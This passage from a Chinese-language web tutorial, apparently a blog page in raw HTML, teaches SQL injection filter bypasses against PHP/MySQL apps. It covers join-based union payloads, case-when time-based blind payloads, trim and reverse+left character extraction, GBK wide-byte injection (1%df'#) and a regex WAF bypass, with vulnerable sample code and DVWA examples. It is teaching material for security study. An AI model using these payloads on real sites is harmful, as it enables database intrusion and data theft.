&lt;/h4&gt;&lt;p&gt;union联合查询注入时，我们经常需要一次性查询多个列，如&lt;code&gt;union select user, password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用join语句代替：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select * from (select database())a join (select version())b#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这段语句是如何工作的？我们逐一拆解：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;(select database())a&lt;/code&gt;&lt;/strong&gt;: 创建了一个只含一列（数据库名）的临时表，并别名为 &lt;code&gt;a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;(select version())b&lt;/code&gt;&lt;/strong&gt;: 创建了另一个只含一列（版本信息）的临时表，并别名为 &lt;code&gt;b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;... a join b&lt;/code&gt;&lt;/strong&gt;: 通过&lt;code&gt;join&lt;/code&gt;将这两个只有一行一列的表连接起来，形成一个一行两列的新表&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select * from...&lt;/code&gt;&lt;/strong&gt;: 最后用 &lt;code&gt;select *&lt;/code&gt; 将这个新表的所有列（即我们想要的数据库名和版本信息）查询出来&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当然，select后面的内容可以改成你想要的内容，select的数量也根据字段数确定，多join几次就行&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;函数过滤&#34;&gt;函数过滤
&lt;/h3&gt;&lt;h4 id=&#34;常见函数过滤&#34;&gt;常见函数过滤
&lt;/h4&gt;&lt;p&gt;下面是一些常见的等价函数：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;常用函数&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;等价函数或语法&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;功能&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;substring(str, m, n)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;substr(str, m, n)&lt;/code&gt;&lt;br&gt;&lt;code&gt;mid(str, m, n)&lt;/code&gt;&lt;br /&gt;&lt;code&gt;reverse+left&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;截取字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;ascii(char)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;ord(char)&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回字符的ASCII码&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;if(exp1, exp2, exp3)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;case when exp1 then exp2 else exp3 end&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;条件判断语句&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;schema()&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回当前数据库名&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;user()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;current_user()&lt;/code&gt;&lt;br&gt;&lt;code&gt;session_user()&lt;/code&gt;&lt;br&gt;&lt;code&gt;system_user()&lt;/code&gt;&lt;br /&gt;&lt;code&gt;@@user&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回当前数据库用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;version()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;@@version&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回数据库版本信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;concat(s1, s2, ...)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;concat_ws(sep, s1, s2, ...)&lt;/code&gt;&lt;br&gt;&lt;code&gt;group_concat(name)&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;拼接字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;hex(str)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;0x...&lt;/code&gt; (十六进制字面量)&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;将字符串转换为十六进制&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;sleep(seconds)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;benchmark(count, exp)&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;造成时间延迟&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;datadir()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;@@datadir&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回数据库路径&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;大部分相信都很熟悉了，这里介绍个几个比较不常见的：&lt;/p&gt;
&lt;h4 id=&#34;case-when语句代替if&#34;&gt;case when语句代替if
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用法一：&lt;/strong&gt;&lt;/mark&gt; &lt;strong&gt;&lt;code&gt;case when exp1 then exp2 else exp3 end&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果exp1为真就返回exp2，反之返回exp3&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用法二：&lt;/strong&gt;&lt;/mark&gt; &lt;strong&gt;&lt;code&gt;case x when y then exp2 else exp3 end&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果x=y则返回exp2，反之返回exp3&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;reverseleft代替substring&#34;&gt;reverse+left代替substring
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;left&lt;/code&gt;函数不能截取某一个精确的字符，但是结合&lt;code&gt;reverse&lt;/code&gt;和&lt;code&gt;ascii&lt;/code&gt;函数可以做到&lt;code&gt;substring+ascii&lt;/code&gt;一样的效果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ascii&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;reverse&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;left&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;n&lt;/span&gt;)))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这个组合可以做到取出string字符串第n位的ascii码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;怎么工作的呢？我们以&lt;code&gt;ascii(reverse(left(&#39;ABCDE&#39;, 3)))&lt;/code&gt;为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;left(&#39;ABCDE&#39;, 3)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先，&lt;code&gt;left()&lt;/code&gt;函数从左边截取前3个字符，得到结果 &lt;code&gt;&#39;ABC&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;reverse(&#39;ABC&#39;)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接着，&lt;code&gt;reverse()&lt;/code&gt;函数将上一步的结果&lt;code&gt;&#39;ABC&#39;&lt;/code&gt;进行反转，得到&lt;code&gt;&#39;CBA&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ascii(&#39;CBA&#39;)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是最关键的一步，&lt;code&gt;ascii()&lt;/code&gt;函数会返回其参数字符串的&lt;strong&gt;第一个字符&lt;/strong&gt;的ASCII码&lt;/p&gt;
&lt;p&gt;在这里，字符串&lt;code&gt;&#39;CBA&#39;&lt;/code&gt;的第一个字符是&lt;code&gt;&#39;C&#39;&lt;/code&gt;，其ASCII码是&lt;code&gt;67&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;trim代替substring&#34;&gt;trim代替substring
&lt;/h4&gt;&lt;p&gt;trim()函数在SQL中主要用于移除字符串首尾的字符&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;both&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;trailing&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;remstr&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;str&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;str&lt;/code&gt;&lt;/strong&gt;: 要处理的源字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;remstr&lt;/code&gt;&lt;/strong&gt;: 要从&lt;code&gt;str&lt;/code&gt;中移除的子字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;both|leading|trailing&lt;/code&gt;&lt;/strong&gt;: 指定移除的位置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;leading&lt;/code&gt;: 只从&lt;strong&gt;开头&lt;/strong&gt;移除&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;trailing&lt;/code&gt;: 只从&lt;strong&gt;结尾&lt;/strong&gt;移除&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;both&lt;/code&gt;: 从&lt;strong&gt;开头和结尾两端&lt;/strong&gt;移除（默认）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;但如果我们让它移除一个不存在的字符，他什么都不会做：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;abcd&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;返回的结果仍然是abcd，因为abcd的开头不是e&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次&lt;code&gt;trim()&lt;/code&gt;操作的结果是否相同，来推断一个字符是否是目标字符串的开头&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(trim(leading &amp;#39;a&amp;#39; from database()) = (trim(leading &amp;#39;b&amp;#39; from database()))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;a&amp;rsquo;）,后者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头也不是&amp;rsquo;b&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为真&lt;/p&gt;
&lt;p&gt;这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(trim(leading &amp;#39;c&amp;#39; from database()) = (trim(leading &amp;#39;d&amp;#39; from database()))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;c&amp;rsquo;）,后者返回 &lt;code&gt;&#39;vwa&#39;&lt;/code&gt; （开头是&amp;rsquo;d&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;vwa&#39;&lt;/code&gt;，表达式为假&lt;/p&gt;
&lt;p&gt;我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(trim(leading &amp;#39;d&amp;#39; from database()) = (trim(leading &amp;#39;e&amp;#39; from database()))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;表达式为&lt;code&gt;&#39;vwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头&lt;/p&gt;
&lt;p&gt;再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了&lt;/p&gt;
&lt;p&gt;如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头&lt;/p&gt;
&lt;p&gt;这样一位一位判断，就能凑出全貌&lt;/p&gt;
&lt;h2 id=&#34;7-宽字节绕过&#34;&gt;#7 宽字节绕过
&lt;/h2&gt;&lt;h3 id=&#34;注入原理&#34;&gt;注入原理
&lt;/h3&gt;&lt;p&gt;宽字节注入是一种专门针对Web应用程序与数据库之间&lt;strong&gt;字符集编码不一致&lt;/strong&gt;而产生的SQL注入漏洞&lt;/p&gt;
&lt;p&gt;其核心原理是PHP转义函数的单字节和MySQL数据库（当使用GBK等宽字节编码时）的多字节之间的矛盾&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Web应用层（如PHP）&lt;/strong&gt;：WAF在工作时，并不关心字符的实际编码 。它只是简单地将它认为是危险的单字节字符（如单引号&lt;code&gt;&#39;&lt;/code&gt;，其十六进制为&lt;code&gt;0x27&lt;/code&gt;），并前面加上一个反斜杠&lt;code&gt;\&lt;/code&gt;进行转义（十六进制为&lt;code&gt;0x5c&lt;/code&gt;），让这个危险的字符失去原本的功能，被当成普通的字符进行查询&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据库层（如MySQL）&lt;/strong&gt;：当数据库连接的字符集被设置为GBK这类宽字节编码时，它会尝试将两个连续的字节解析为一个汉字或其他宽字符&lt;/p&gt;
&lt;p&gt;在GBK编码中，一个宽字节的第一个字节的范围是&lt;code&gt;0x81-0xFE&lt;/code&gt; 。当MySQL遇到这个范围内的字节时，它会认为这是一个宽字符的开始，并把紧随其后的下一个字节也一并“吃掉”，作为该字符的第二部分&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者正是利用了MySQL的这个特性，构造一个第一个字节在&lt;code&gt;0x81-0xFE&lt;/code&gt;范围内、而第二个字节恰好是&lt;code&gt;0x5c&lt;/code&gt;（即反斜杠&lt;code&gt;\&lt;/code&gt;）的字符，让MySQL把PHP辛苦加上去的反斜杠当作普通字符“吃掉”，从而使单引号&lt;code&gt;&#39;&lt;/code&gt;重新变有效，导致注入成功&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;注入过程&#34;&gt;注入过程
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mysql_query&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SET NAMES gbk&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;check_addslashes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码的关键点在于，它&lt;strong&gt;使用&lt;code&gt;SET NAMES gbk&lt;/code&gt;将数据库连接设置为GBK编码&lt;/strong&gt;，同时&lt;strong&gt;又使用了自定义的&lt;code&gt;check_addslashes&lt;/code&gt;函数对输入进行转义&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;普通注入(1&amp;rsquo;#)：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;攻击者提交&lt;code&gt;?id=1&#39;#&lt;/code&gt;，&lt;code&gt;check_addslashes&lt;/code&gt;函数将&lt;code&gt;&#39;&lt;/code&gt;转义为&lt;code&gt;\&#39;&lt;/code&gt; ，mysql最后执行的语句是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的转义后的&lt;code&gt;&#39;&lt;/code&gt;变成了普通的符号，无法闭合字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;宽字节注入(1%df&amp;rsquo;#)：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;攻击者提交&lt;code&gt;?id=1%df&#39;#&lt;/code&gt;，&lt;code&gt;check_addslashes&lt;/code&gt;函数将&lt;code&gt;&#39;&lt;/code&gt;转义为&lt;code&gt;\&#39;&lt;/code&gt;，在url编码下变成：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=1%df%5c%27#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;%5c&lt;/code&gt;就是被添加进去的反斜杠&lt;code&gt;\&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流&lt;code&gt;0xdf 0x5c 0x27&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MySQL首先读到&lt;code&gt;0xdf&lt;/code&gt;，因为它在&lt;code&gt;0x81-0xFE&lt;/code&gt;范围内，MySQL认为这是一个宽字符的开始&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;随后，MySQL“吃掉”了紧随其后的&lt;code&gt;0x5c&lt;/code&gt;（反斜杠&lt;code&gt;\&lt;/code&gt;）作为这个宽字符的第二字节&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;0xdf5c&lt;/code&gt;被组合成了一个宽字符（在GBK中为“運”），此时，用于转义的反斜杠&lt;code&gt;\&lt;/code&gt;已经被消耗掉了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MySQL继续向后解析，遇到了&lt;code&gt;0x27&lt;/code&gt;（单引号&lt;code&gt;&#39;&lt;/code&gt;）这个单引号前面已经没有了反斜杠，它变成了一个有效的SQL语法符号&lt;/p&gt;
&lt;p&gt;最终，MySQL实际执行的语句变成了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1運&amp;#39;&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8-正则表达式绕过&#34;&gt;#8 正则表达式绕过
&lt;/h2&gt;&lt;p&gt;众所周知，正则表达式里有很多的修正符，只有设置适当，才能过滤到目标的字符串&lt;/p&gt;
&lt;p&gt;有些粗心的WAF没有设置好修正符，这就让我们有机可乘：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$pattern&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;/select.*from/i&amp;#39;&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$pattern&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;检测到攻击，脚本终止！(Attack Detected!)&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
